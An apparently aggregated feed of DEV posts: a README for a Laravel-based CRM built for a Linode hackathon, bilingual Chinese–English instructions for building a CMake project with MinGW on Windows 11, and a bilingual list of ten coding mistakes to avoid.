This app has the following entities in it -

1. Account - Stores the information of client organisation.

2. Contact - Stores the information of the individual contacts in the client's organisation.

3. Lead - Stores the information of Potential clients.

4. Deal - Stores the information of Opportunities.

5. Products - Stores the list of products that the company sell.

Link to Source Code

This is a app created for Linode hackathon on Dev.

Tech stack

  • PHP (Laravel)
  • Filament PHP
  • Tailwind CSS
  • Alpine JS
  • PostgreSQL

Live demo

The live demo of app is available here.

Local Installation

  1. Clone the repository
  2. Run the following commands -
composer install #installing php dependencies npm install # installing the JS dependencies npm run build # to build the frontend assets
  1. Replace the database credentials in the .env file.
DB_CONNECTION=pgsql
DB_HOST=127.0.0.1
DB_PORT=5432
DB_DATABASE=tiny_crm
DB_USERNAME=postgres
DB_PASSWORD=password
  1. Now run the following command to create the required tables in database -

Optionally, you can create the dummy data by running the seeder as -




Permissive License

MIT license

Background

There are a lot of CRM systems available in the market currently such as Salesforce, Microsoft Dynamics, etc.
The problem with these systems are that they are very broad and quite expensive and not easy to use and also needs a dedicated developer to manage it, which becomes hard for SMEs to use and keep using these systems.

So, I decided to make a CRM system which is easy to use have important required functionalities and at the same time not too expensive for SMEs.

How I built it

I have used linode's compute instances for servers and the linode's managed PostgreSQL databasefor persistent storage.

While making this app I have learned to create compute instances in the linode's cloud platform.
I have also learned installing Ngnix server and SSL certificate on the server.

I have also learned creating a managed database instance on cloud and why it is an easy solution for solo devs and small teams as one does not need to manage the database by themselves.

I have used Laravel web framework for creating the app. I have also used Filament admin panel generator to quickly generate CRUD app functionality.

Additional Resources/Info

  1. Built a website using Laravel framework on Linode

  2. Linode Products

item.title: 使用 MinGW 在 Windows 11 上构建项目 | Build a project on Windows 11 using MinGW
item.description:
团团转

发表于 2 月 18 日

假设 CMakeLists.txt 位于项目的根文件夹中，请按照下列步骤操作：

创建构建文件夹：

mkdir build

切换到构建文件夹：

cd build

使用 MinGW 生成 Makefile

cmake -G "MinGW Makefiles" ..

使用 mingw32-make 编译项目：

mingw32-make

原文:

Tuan Tu Tran

Posted on Feb 18

Assuming that the CMakeLists.txt is located in the root folder of the project, follow these steps:

a. Create a build folder:

mkdir build

b. Change to the build folder:

cd build

c. Use MinGW to generate the Makefile

cmake -G "MinGW Makefiles" ..

(The ".." at the end of the cmake command tellls it to look for the CMakeLists.txt file in the parent directory)

d. Compile the project using mingw32-make:

mingw32-make

Reference:
cmake.org/cmake/help/v3.12/generator/Mi…

item.title: 编码时不要做的 10 件事！ | Top 10 Things to not do while coding!
item.description:
编码是一项高技能的职业，需要注意细节、专注和对编码语言的良好理解。 然而，即使是最有经验的编码员也会犯错，而且一些错误可能会导致数小时的挫败感，甚至更糟的是，程序崩溃。 为了帮助您避免这些陷阱，我在这里收集了编码时最不能做的 10 件事。 让我们来看看！

  • 不要忽视测试：测试是编码的重要组成部分，绝不能忽视。 如果不进行测试，您的代码可能无法按预期工作，错误可能会被忽视，从而导致严重的后果。

  • 不要忘记评论：评论是编码的重要组成部分，因为它们可以帮助其他人理解您的代码。 它们还可以帮助您记住编写代码时的想法，并且可以更轻松地调试程序。

  • 不要编写草率的代码：草率的代码会导致错误、崩溃和安全漏洞。 确保编写干净、高效且文档齐全的代码以避免这些问题。

  • 不要对值进行硬编码：对值进行硬编码会使代码的灵活性降低，并且对代码的更改会变得更具挑战性。 相反，使用变量和常量可以使您的代码更具适应性和更易于维护。

  • 不要使您的代码过于复杂：简单的代码通常比复杂的代码更好。 避免给你的代码增加不必要的复杂性，力求简单，使其更容易理解和维护。

  • 不要将业务逻辑与用户界面逻辑混合：业务逻辑应该与用户界面逻辑分开，以便更容易维护和测试您的代码。 保持代码井井有条，避免将两者混用。

  • 不要忽略错误处理：错误处理是编码的重要组成部分，可以为您节省数小时的调试时间。 确保有效地处理错误以防止崩溃和其他问题。

  • 不要害怕寻求帮助：如果您遇到编码问题，请不要害怕寻求帮助。 您可以在许多在线社区和论坛中找到帮助和支持。

  • 不要假设您的代码是安全的：安全性是编码时的一个重要问题，确保您的代码安全至关重要。 不要假设您的代码是安全的，并采取措施确保它是安全的。

  • 不要放弃：编码可能具有挑战性，当事情没有按计划进行时很容易气馁。 然而，坚持和不断尝试是必不可少的。 通过时间、练习和耐心，您可以成为一名熟练且成功的编码员。

关闭

总之，编码是一项令人兴奋且具有挑战性的职业，需要纪律、耐心和对细节的关注。 通过避免这些常见错误，您可以提高编码技能、编写更高效的代码并避免代价高昂的错误。 记得测试你的代码，经常评论，力求简单明了。 通过这些技巧，您将成为一名熟练且成功的编码员。

永恒的开发帖子...

我多年前就希望知道的 Git 概念

开发人员使用最多的技术不是 Javascript。

它不是 Python 或 HTML。

它甚至很少在面试中被提及或被列为工作的先决条件。

当然，我说的是 Git 和版本控制。

一旦暂停，dhruvjoshi9 将无法发表评论或发布帖子，直到他们的暂停被解除。

解除暂停后，dhruvjoshi9 将能够再次发表评论和发布帖子。

一旦取消发布，dhruvjoshi9 的所有帖子都将隐藏起来，只有他们自己可以访问。

如果 dhruvjoshi9 没有被暂停，他们仍然可以从他们的仪表板重新发布他们的帖子。

笔记：

感谢您保护 DEV 社区 👩‍💻👨‍💻 的安全。 以下是标记 dhruvjoshi9 的方法：

降低 dhruvjoshi9 的所有帖子的可见度

报告其他不当行为

取消标记 dhruvjoshi9 将恢复其帖子的默认可见性。



原文:

Coding is a highly skilled profession that requires attention to detail, focus, and a good understanding of the coding language. However, even the most experienced coders make mistakes, and some mistakes can lead to hours of frustration or even worse, program crashes. To help you avoid these pitfalls, here i collected the top 10 things to not do while coding. Lets see!

  • Don't Neglect Testing: Testing is an essential part of coding that should never be overlooked. Without testing, your code may not work as intended, and bugs can go unnoticed, leading to serious consequences.

  • Don't Forget to Comment: Comments are a crucial part of coding as they help others understand your code. They also help you remember what you were thinking when you wrote the code, and they make it easier to debug your program.

  • Don't Write Sloppy Code: Sloppy code can lead to bugs, crashes, and security vulnerabilities. Make sure to write clean, efficient, and well-documented code to avoid these issues.

  • Don't Hardcode Values: Hardcoding values can make your code less flexible, and changes to the code can become more challenging. Instead, use variables and constants to make your code more adaptable and easier to maintain.

  • Don't Overcomplicate Your Code: Simple code is often better than complex code. Avoid adding unnecessary complexity to your code, and strive for simplicity to make it easier to understand and maintain.

  • Don't Mix Business Logic with User Interface Logic: Business logic should be separated from user interface logic to make it easier to maintain and test your code. Keep your code organized, and avoid mixing the two.

  • Don't Ignore Error Handling: Error handling is an essential part of coding that can save you hours of debugging time. Make sure to handle errors effectively to prevent crashes and other issues.

  • Don't Be Afraid to Ask for Help: If you're stuck on a coding problem, don't be afraid to ask for help. There are many online communities and forums where you can find help and support.

  • Don't Assume Your Code Is Secure: Security is a significant concern when coding, and it's essential to make sure your code is secure. Don't assume that your code is secure, and take steps to ensure that it is.

  • Don't Give Up: Coding can be challenging, and it's easy to get discouraged when things don't go as planned. However, it's essential to persevere and keep trying. With time, practice, and patience, you can become a skilled and successful coder.

Closing up

In conclusion, coding is an exciting and challenging profession that requires discipline, patience, and attention to detail. By avoiding these common mistakes, you can improve your coding skills, write more efficient code, and avoid costly errors. Remember to test your code, comment frequently, and strive for simplicity and clarity. With these tips, you'll be on your way to becoming a proficient and successful coder.

Timeless DEV post...

Git Concepts I Wish I Knew Years Ago

The most used technology by developers is not Javascript.

It's not Python or HTML.

It hardly even gets mentioned in interviews or listed as a pre-requisite for jobs.

I'm talking about Git and version control of course.

Adam Nathaniel Davis - Feb 8

Elijah Trillionz - Feb 13
